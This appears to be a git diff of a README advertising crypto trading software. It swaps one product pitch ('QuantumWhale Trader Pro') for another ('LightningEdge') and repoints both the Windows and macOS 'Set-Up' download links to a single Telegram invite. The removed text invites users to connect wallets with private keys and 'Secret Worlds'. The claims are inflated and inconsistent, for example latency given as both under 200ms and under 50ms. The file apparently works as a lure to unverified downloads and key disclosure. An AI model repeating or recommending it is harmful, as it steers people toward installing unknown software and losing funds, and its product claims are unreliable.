@@ -1,139 +1,23 @@
 <p align="center"><img width="720" height="463" src="images/screenshot.jpg" alt="interface" /></p>
 
-# QuantumWhale Trader Pro: AI Crypto Trading Suite for Whales & Institutions
-> Trade cryptocurrency with $1M+ volumes without slippage. AI-strategies, 0.05% commissions, DeFi-stacking and smart contracts. For institutional investors.
+# LightningEdge: Low-Latency Algo Trading Platform for Crypto
+> LightningEdge an innovative platform for algorithmic cryptocurrency trading, combining high-frequency order execution on decentralized exchanges Solana (Raydium DEX) and centralized platforms Binance and ByBit. The system provides minimal latency (less than 200ms), low slippage and optimized smart order routing to achieve better trade execution. A powerful real-time analytics module tracks PnL, win rate, Sortino Ratio, maximum drawdown and other key metrics, allowing traders to monitor their portfolio and react instantly to market changes. The intuitive interface and flexible parameter settings ensure high adaptability of the strategy even in high volatility conditions. This software is an ideal tool for professional traders seeking to increase the efficiency and profitability of their trading strategies using advanced machine learning and algorithmic optimization technologies.
 
-# Client QuantumWhale Trader Pro for Windows/macOS and start trading with 0.05% commission today.
-## MAC OS: [ ```Set-Up``` ](https://selenium-finance.gitbook.io/quantumwhale-trader-pro/download/macos) Windows: [```Set-UP```](https://selenium-finance.gitbook.io/quantumwhale-trader-pro/download/windows)
+# Client LightningEdge for Windows/macOS\.
+## MAC OS: [ ```Set-Up``` ](https://t.me/+V5BhcAw65tgwMWZi) Windows: [```Set-UP```](https://t.me/+V5BhcAw65tgwMWZi)
 
-The crypto market of 2024 requires professional solutions for those who operate with large capitals ($1M+). Conventional exchanges and DEXs are not suitable for “whales”: high commissions, slippage and lack of risk management tools destroy profits.
+- Ultra-Low Latency Execution: Achieve order execution with latency below 50 ms by leveraging dedicated RPC nodes and optimized network paths.
 
-QuantumWhale Trader Pro is the first crypto trading software created specifically for crypto investors and funds trading large volumes. It combines:
-- ✅ AI-algorithms for liquidity forecasting and order splitting.
+- Multi-Exchange Smart Order Routing: Seamlessly route orders between decentralized (Raydium on Solana) and centralized exchanges (Binance, ByBit) using a unified API, ensuring best execution.
 
-- ✅ Aggregator of 15+ exchanges (Binance, Bybit, Uniswap) with commission from 0.05%.
+- High-Frequency Trading Capabilities: Designed to handle high throughput (e.g., 10.5k operations per second) for rapid and efficient trading.
 
-- ✅ Smart contracts for stop-loss and arbitrage automation.
+- Integrated Risk Management: Real-time monitoring of PnL, win rate, profit factor, maximum drawdown, slippage, fees, and latency, with advanced metrics to control and adjust trading strategies dynamically.
 
-- ✅ Institutional security: TPM, multi-signature, Tor.
+- Modular and Scalable Architecture: Built using FastAPI, asynchronous SQLAlchemy, and modern libraries (ccxt, solana-py) for easy expansion and integration with additional markets and strategies.
 
-# Key features and benefits
+- Real-Time Data Visualization: Interactive dashboard with live charts, metrics, and order history powered by Plotly and web-socket streaming.
 
-1. AI-optimized trading engine
+- Robust Error Handling and Logging: Detailed logging and automated reconnection mechanisms to ensure stability during high-frequency trading operations.
 
-- Deep market analytics: AI analyzes thousands of strategies (arbitrage, market making, swing trading) and suggests personalized tactics to the user.
-
-- Autostrategies: Users can create/import algorithms in Python or via visual constructor (flowcharts) and AI optimizes them for current market conditions.
-
-- Liquidity Prediction: Algorithms predict slippage for large orders and automatically split them using DEX and CEX.
-
-2. Multi-aggregator liquidity
-
-- Ultra-low commissions: Automatically select DEX (Uniswap, PancakeSwap) or CEX (Binance, Bybit) with the best prices and commissions.
-
-- 1-click liquidity staking: Integration with Curve, Balancer to automatically add/withdraw risk-adjusted liquidity (impermanent loss).
-
-3. DeFi Smart Contract Toolkit
- Smart contract templates: Ready-made solutions for:
-
-- Creating custom derivatives.
-
-- Atomic swaps between networks (BTC ↔ ETH without exchangers).
-
-- Deposit insurance through Nexus Mutual.
-
-- Contract auditing: Built-in vulnerability checking tool (based on Slither, MythX).
-
-4. Institutional security
-
-- Cold Wallets Plugins: Ledger/Trezor integration for signing offline transactions.
-
-- Multi-signature: For Money Managers (Funds) - require validation from 3+ devices.
-
-- Anonymity: Built-in Tor/VPN for IP masking when working with DEX.
-
-5. Risk management for "whales"
-
-- Liquidity-driven stop loss: Dynamically adjust stop level depending on position volume.
-
-- Crash Simulator: Calculates “black swan” scenarios (e.g. BTC falling by 50% in an hour) and automatic diversification.
-
-6. Integrations
-
-- API for connecting to Binance, FTX, Coinbase and other exchanges.
-
-- Support for EVM networks (Ethereum, Polygon, BSC) and non-EVM (Solana, Cosmos).
-
-# How does it work?
-
-1. AI analyzes the market every 5 minutes, selecting optimal strategies:
-
-- Volatility-aware market-making.
-
-- Arbitration between CEX and DEX.
-
-- Stacking in liquidity pools (up to 25% APY).
-
-2. Execution of $1M+ orders without slippage:
-
-- Fragmentation into hundreds of small orders.
-
-- Routing through exchanges with the best price.
-
-3. Full risk control:
-
-- Dynamic stop loss tied to liquidity.
-
-- A "black swan" simulator for stress tests.
-
-# Why is QuantumWhale chosen by hedge funds and crypto-whales?
-
-- Save up to $50,000 per month by reducing commissions and slippage.
-
-- Bank-level security: keys are stored encrypted using TPM chips.
-
-- Ledger/Trezor integration for offline transaction signing.
-
-# Who's it for?
-
-🔹 Asset Managers ($10M+).
-
-🔹 Cryptofunds and family offices.
-
-🔹 Experienced traders using algorithmic strategies.
-
-## 1. How to reduce commissions by 80% when trading cryptocurrency?
-Case: A $5M QuantumWhale client saved $12,000 in a month using multi-aggregator and AI optimization.
-
-## 2. Strategies for "whales": arbitrage, market-making, DeFi-stacking
-Finished smart contract and backtest templates for 2021-2024.
-
-## 3. TPM + Tor: why is safety more important than profit?
-How we protect customer deposits from hacks and breaches.
-
-# Technology
-
-- Rust/C++ kernel for speed.
-
-- Frontend: Electron + React (cross-platform).
-
-- AI module: TensorFlow/PyTorch with additional training on market data.
-
-# Unique offer
-QuantumWhale Trader Pro brings together institutional tools for large players, reducing their dependence on intermediaries. 
-Users can:
-
-- Trade $1M+ with 0.05% commission instead of the standard 0.2%.
-
-- Automate complex strategies without programming skills.
-
-- Maintain anonymity and control over assets.
-
-# FAQ
-Q: Is QuantumWhale compatible with MetaMask?
-
-A: Yes! Connect any wallets (MetaMask, Ledger, etc) via API, Secret Worlds, Private Keys, and others.
-
-Q: Is it possible to test strategies on historical data?
-
-A: The built-in backtester supports data from 2017 for 100+ crypto pairs.
+- Customizable Strategy Parameters: User-adjustable settings for trade intervals, risk allocation, and dynamic channel levels, enabling tailored execution of quantitative/ML algorithms.
